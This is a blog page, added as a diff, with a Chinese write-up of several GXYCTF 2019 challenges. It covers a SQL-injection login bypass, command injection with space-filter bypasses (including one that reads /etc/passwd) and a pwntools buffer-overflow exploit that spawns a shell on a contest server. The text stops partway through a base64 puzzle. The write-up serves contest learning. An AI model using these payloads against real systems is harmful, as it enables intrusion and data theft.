@@ -1,0 +1,788 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="ctf_wp,">
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="mutou-jun's blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="2019GXYCTF于昨天晚上结束,做得很是糟糕！一段时间 不做题，pwn快忘完了！难受，不过还是先准备期末考试吧！">
+<meta name="keywords" content="ctf_wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GXYCTF_wp0">
+<meta property="og:url" content="http://yoursite.com/2019/12/22/GXYCTF_wp0/index.html">
+<meta property="og:site_name" content="mutou-jun&#39;s blog">
+<meta property="og:description" content="2019GXYCTF于昨天晚上结束,做得很是糟糕！一段时间 不做题，pwn快忘完了！难受，不过还是先准备期末考试吧！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKosU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKTLF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxK4zV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKIMT.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKHZ4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKbdJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxMeQf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKqo9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKOiR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKXJ1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKjRx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKvz6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxKzQK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/22/QxMpLD.png">
+<meta property="og:updated_time" content="2019-12-21T18:45:57.798Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GXYCTF_wp0">
+<meta name="twitter:description" content="2019GXYCTF于昨天晚上结束,做得很是糟糕！一段时间 不做题，pwn快忘完了！难受，不过还是先准备期末考试吧！">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/12/22/QxKosU.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"always"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> GXYCTF_wp0 | mutou-jun's blog </title>
+</head>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">mutou-jun's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                GXYCTF_wp0
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2019-12-22T00:06:07+08:00" content="2019-12-22">
+              2019-12-22
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>2019GXYCTF于昨天晚上结束,做得很是糟糕！一段时间 不做题，pwn快忘完了！难受，不过还是先准备期末考试吧！</p>
+<a id="more"></a>
+<h3 id="0x00：GXYCTF部分详细题解"><a href="#0x00：GXYCTF部分详细题解" class="headerlink" title="0x00：GXYCTF部分详细题解"></a>0x00：GXYCTF部分详细题解</h3><blockquote>
+<p>2019GXYCTF于昨天晚上结束，这里我写下较详细的部分题解，希望可以帮到大家！</p>
+</blockquote>
+<h3 id="0x01：baby-sqli"><a href="#0x01：baby-sqli" class="headerlink" title="0x01：baby_sqli"></a>0x01：baby_sqli</h3><blockquote>
+<p>进来后是一个  登录页面<br><img src="https://s2.ax1x.com/2019/12/22/QxKosU.png" alt="QxKosU.png"></p>
+</blockquote>
+<p>首先 尝试下</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>登录，然后查看 源代码，发现一串很可疑的字符串<br><img src="https://s2.ax1x.com/2019/12/22/QxKTLF.png" alt="QxKTLF.png"></p>
+<p>尝试了下，发现是base32编码</p>
+<blockquote>
+<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
+</blockquote>
+<p>对其进行解码得到：</p>
+<blockquote>
+<p>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</p>
+</blockquote>
+<p>然后base64 解码得到：</p>
+<blockquote>
+<p>select * from user where username = ‘$name’</p>
+</blockquote>
+<p>应该是 提示我们 要从 username 入手</p>
+<p>我们查看下  他有几个字段</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">' union select 1,2,3#</span></span><br><span class="line"><span class="string">admin'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3,4<span class="comment">#</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到 是3个字段<br><br>我们猜测字段名是  </p>
+<blockquote>
+<p>ip username password</p>
+</blockquote>
+<p>然后我们通过下面语句</p>
+<blockquote>
+<p>admin’ union select 1,’admin’,3#</p>
+</blockquote>
+<p>//即把admin 放到第二个位置 不报错<br><br>得到第二个字段就是我们的username字段<br><br>然后 题目提示了”md5”,于是我们便可以去猜测 它的后端是怎么写的:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$row;</span></span><br><span class="line"><span class="php">$pass=$_POST[<span class="string">'pw'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($row[<span class="string">'username'</span>]==<span class="string">'admin'</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($row[<span class="string">'password'</span>]==md5($pass))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"wrong pass!"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"wrong user!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>就是 我们的sql语句执行时，</p>
+<p>passsword字段中的内容要==md5(我们密码栏输入的password)</p>
+<p>然后我们便随便找个 密码 就123吧：</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：<span class="number">123</span></span><br><span class="line">md5 : 202<span class="type">cb962ac59075b964b07152d234b70</span></span><br></pre></td></tr></table></figure>
+
+<p>于是我们便构造这样的payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username栏：' union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'202cb962ac59075b964b07152d234b70'</span><span class="comment">#</span></span><br><span class="line"><span class="keyword">password</span>栏：<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p>登录便可以得到</p>
+<blockquote>
+<p> flag：GXY{y0u_4re_not_aDmin!}</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/12/22/QxK4zV.png" alt="QxK4zV.png"><br><br></p>
+<h3 id="0x02：ping-ping-ping"><a href="#0x02：ping-ping-ping" class="headerlink" title="0x02：ping ping ping"></a>0x02：ping ping ping</h3><p>我们进来后可以看到：<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKIMT.png" alt="QxKIMT.png"></p>
+<p>这题应该时  考查 任意命令执行的<br><br>我们首先 ping 本地<br><br>填入 <br></p>
+<blockquote>
+<p>127.0.0.1;ls </p>
+</blockquote>
+<p>点击确定 得到)<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKHZ4.png" alt="QxKHZ4.png"><br><br>然后，既然flag.php在同级目录下，直接 cat 拿到就好了<br><br>如果它没有过滤的话我们应该这样填入 <br></p>
+<blockquote>
+<p>127.0.0.1;cat flag.php</p>
+</blockquote>
+<p>但经过我们的输入发现，这题它把 空格和 ‘flag’ 给过滤了，<br><br>所以，我们得想办法把 空格和 ‘flag’ 给绕过</p>
+<p>我们先来 绕过下空格，<br><br>在这之前我们来了解下 </p>
+<h3 id="0x03：linux-常见空格绕过方法"><a href="#0x03：linux-常见空格绕过方法" class="headerlink" title="0x03：linux 常见空格绕过方法"></a>0x03：linux 常见空格绕过方法</h3><ul>
+<li><p>使用&lt;或者&lt;&gt;来绕过空格</p>
+<blockquote>
+<p>cat&lt;flag.txt</p>
+</blockquote>
+</li>
+<li><p>花括号 扩展{OS_COMMAND,ARGUMENT}</p>
+<blockquote>
+<p>{cat,/etc/passwd}</p>
+</blockquote>
+</li>
+<li><p>$IFS绕过</p>
+<blockquote>
+<p>cat$IFSflag.txt</p>
+</blockquote>
+</li>
+<li><p>变量控制</p>
+<blockquote>
+<p>x=$’cat\x09./a.txt’&amp;&amp;$x</p>
+</blockquote>
+</li>
+</ul>
+<p>经过 我们测试 这题我们可以通过 $IFS 绕过 空格</p>
+<p>然后我们来 绕过  ‘flag’过滤</p>
+<p>这里我们 选择构造变量然后使用变量去绕过：<br>于是最后我们构造 payload为：</p>
+<blockquote>
+<p>127.0.0.1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</p>
+</blockquote>
+<p>然后BurpSuite抓包便成功拿到flag.php中得内容</p>
+<blockquote>
+<p>flag：GXY(1_sh0uld_ban_Icmp_4tFirst)<br><img src="https://s2.ax1x.com/2019/12/22/QxKbdJ.png" alt="QxKbdJ.png"></p>
+</blockquote>
+<blockquote>
+<p>这次很难受，就做出来一道pwn!我还是写详细些吧！</p>
+</blockquote>
+<h3 id="0x04：fantasy"><a href="#0x04：fantasy" class="headerlink" title="0x04：fantasy"></a>0x04：fantasy</h3><blockquote>
+<p>首先查看程序属性及保护：</p>
+</blockquote>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">fantasy</span></span><br><span class="line"><span class="attr">fantasy:</span> <span class="string">ELF</span> <span class="number">64</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">x86-64,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib64/l,</span> </span><br><span class="line"><span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=0964804519339e930431d2c6f850fd89c3e79f29,</span> <span class="string">not</span> <span class="string">stripped</span></span><br><span class="line"><span class="string">---------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">fantasy</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看出该程序是 动态链接的64位elf文件，另外仅开启NX保护！<br><br>然后我们将它拖入ida中（64位）：</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  welcome(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OK,see you again"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们进去vul()函数中：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]//这里我们可以看出buf距离rbp的地址是0x30， 即48</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I got a message bank ,you can store something in it!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your message"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x40</span>uLL); <span class="comment">//这里有个很明显得栈溢出漏洞</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"OK , i got it ,let me see if i can bring you fantasy!!!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另外，我们可以在ida函数栏可以看到fantasy函数，发现是后门函数</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fantasy()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> <span class="title">system</span><span class="params">(<span class="string">"/bin/sh"</span>)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>于是我们先把它地址先记下来：0x400735<br><img src="https://s2.ax1x.com/2019/12/22/QxMeQf.png" alt="QxMeQf.png"></p>
+<h3 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h3><blockquote>
+<p>我们可通过栈溢出漏洞去覆盖掉ret_addr为 fantasy函数的地址即可拿到pwn掉程序！<br><br>于是构造payload：<br>payload=’a’*48+p64(0xdeadbeef)+p64(0x400735)</p>
+</blockquote>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">原栈结构大概是这样（如下）：</span><br><span class="line"><span class="number">0000</span>| buf</span><br><span class="line"><span class="number">0008</span>|</span><br><span class="line"><span class="number">0016</span>|</span><br><span class="line"><span class="number">0024</span>| </span><br><span class="line"><span class="number">0032</span>| </span><br><span class="line"><span class="number">0040</span>| </span><br><span class="line"><span class="number">0048</span>| </span><br><span class="line"><span class="number">0056</span>| rbp</span><br><span class="line"><span class="number">0064</span>| ret_addr</span><br><span class="line">————————————————————————————————————————————</span><br><span class="line">我们构造后，栈结构就变成这样下面这样了，</span><br><span class="line">执行到返回地址时，程序就会返回到我们构造的fantasy后门函数去继续执行！</span><br><span class="line">——————————————————————————————————————————————</span><br><span class="line"><span class="number">0000</span>| a*<span class="number">48</span></span><br><span class="line"><span class="number">0008</span>|</span><br><span class="line"><span class="number">0016</span>|</span><br><span class="line"><span class="number">0024</span>| </span><br><span class="line"><span class="number">0032</span>| </span><br><span class="line"><span class="number">0040</span>| </span><br><span class="line"><span class="number">0048</span>| </span><br><span class="line"><span class="number">0056</span>| <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="number">0064</span>| fantasy_addr</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">conn</span>=process('./fantasy')</span><br><span class="line"><span class="attribute">conn</span>=remote('183.129.189.60','10025')</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x30+p64(0xdeadbeef)+p64(0x400735)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>python 跑下便可以拿到flag</p>
+<blockquote>
+<p>python fantasy.py<br><br>GXY{Welcome_to_Binary_world}<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKqo9.png" alt="QxKqo9.png"></p>
+</blockquote>
+<h3 id="0x05：fu"><a href="#0x05：fu" class="headerlink" title="0x05：fu"></a>0x05：fu</h3><blockquote>
+<p>看题目联想到了  与佛论禅！<br></p>
+</blockquote>
+<p>下载得到的是一个压缩包，里面有一个图片和一个加密的fo.txt文本，如下图：<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKOiR.png" alt="QxKOiR.png"><br><br>我首先想到的是用明文攻击 ，做这题，但却失败告终！<br><br>这题其实直接修复下 下载的压缩包，就可以的<br><img src="https://s2.ax1x.com/2019/12/22/QxKXJ1.png" alt="QxKXJ1.png"><br>然后就得到 修复后的 rebuilt.fu.zip<br><img src="https://s2.ax1x.com/2019/12/22/QxKjRx.png" alt="QxKjRx.png"><br><br>然后打开 fo.txt文本，果然不出我们所料，然后我们将  佛曰内容进行解密即可！<br><img src="https://s2.ax1x.com/2019/12/22/QxKvz6.png" alt="QxKvz6.png"></p>
+<blockquote>
+<p>佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸</p>
+</blockquote>
+<p>与佛论禅网址：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br><img src="https://s2.ax1x.com/2019/12/22/QxKzQK.png" alt="QxKzQK.png"></p>
+<blockquote>
+<p>flag：flag{w0_fo_ci_Be1}</p>
+</blockquote>
+<h3 id="0x06：base乱码"><a href="#0x06：base乱码" class="headerlink" title="0x06：base乱码"></a>0x06：base乱码</h3><blockquote>
+<p>这题 首先给了我们这么多行的base64编码的字符串</p>
+</blockquote>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Q2V0dGUgbnVpdCwK</span><br><span class="line">SW50ZW5hYmxlIGluc29tbmllLAp=</span><br><span class="line">TGEgZm9saWUgbWUgZ3VldHRlLAo=</span><br><span class="line">SmUgc3VpcyBjZSBxdWUgamUgZnVpcwp=</span><br><span class="line">SmUgc3ViaXMsCt==</span><br><span class="line">Q2V0dGUgY2Fjb3Bob25pZSwK</span><br><span class="line">UXVpIG1lIHNjaWUgbGEgdOmUmnRlLAp=</span><br><span class="line">QXNzb21tYW50ZSBoYXJtb25pZSwK</span><br><span class="line">RWxsZSBtZSBkaXQsCo==</span><br><span class="line">VHUgcGFpZXJhcyB0ZXMgZGVsaXRzLAp=</span><br><span class="line">UXVvaSBxdSdpbCBhZHZpZW5uZSwK</span><br><span class="line">T24gdHJh5Y2vbmUgc2VzIGNoYeWNr25lcywK</span><br><span class="line">U2VzIHBlaW5lcywK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCm==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCl==</span><br><span class="line">QXV4IHJlcXVpZW1zLAr=</span><br><span class="line">VHVhbnQgcGFyIGRlcGl0LAq=</span><br><span class="line">Q2UgcXVlIGplIHNlbWUsCt==</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCp==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCp==</span><br><span class="line">RXQgYXV4IGJsYXNwaGVtZXMsCo==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCl==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK</span><br><span class="line">TCdlbm5lbWksCu==</span><br><span class="line">VGFwaSBkYW5zIG1vbiBlc3ByaXQsCp==</span><br><span class="line">RumUmnRlIG1lcyBkZWZhaXRlcywK</span><br><span class="line">U2FucyByZXBpdCBtZSBkZWZpZSwK</span><br><span class="line">SmUgcmVuaWUsCq==</span><br><span class="line">TGEgZmF0YWxlIGhlcmVzaWUsCh==</span><br><span class="line">UXVpIHJvbmdlIG1vbiDplJp0cmUsCo==</span><br><span class="line">SmUgdmV1eCByZW5h5Y2vdHJlLAp=</span><br><span class="line">UmVuYeWNr3RyZSwK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCn==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCq==</span><br><span class="line">QXV4IHJlcXVpZW1zLAp=</span><br><span class="line">VHVhbnQgcGFyIGRlcGl0LAq=</span><br><span class="line">Q2UgcXVlIGplIHNlbWUsCo==</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCm==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCl==</span><br><span class="line">RXQgYXV4IGJsYXNwaGVtZXMsCm==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCu==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK</span><br><span class="line">UGxldXJlbnQgbGVzIHZpb2xvbnMgZGUgbWEgdmllLAp=</span><br><span class="line">TGEgdmlvbGVuY2UgZGUgbWVzIGVudmllcywK</span><br><span class="line">U2lwaG9ubmVlIHN5bXBob25pZSwK</span><br><span class="line">RGVjb25jZXJ0YW50IGNvbmNlcnRvLAq=</span><br><span class="line">SmUgam91ZSBzYW5zIHRvdWNoZXIgbGUgRG8sCo==</span><br><span class="line">TW9uIHRhbGVudCBzb25uZSBmYXV4LAp=</span><br><span class="line">SmUgbm9pZSBtb24gZW5udWksCo==</span><br><span class="line">RGFucyBsYSBtZWxvbWFuaWUsCl==</span><br><span class="line">SmUgdHVlIG1lcyBwaG9iaWVzLAq=</span><br><span class="line">RGFucyBsYSBkZXNoYXJtb25pZSwK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCv==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCn==</span><br><span class="line">QXV4IHJlcXVpZW1zLAp=</span><br><span class="line">VHVhbnQgcGFyIGRlcGl0LAo=</span><br><span class="line">Q2UgcXVlIGplIHNlbWUsCm==</span><br><span 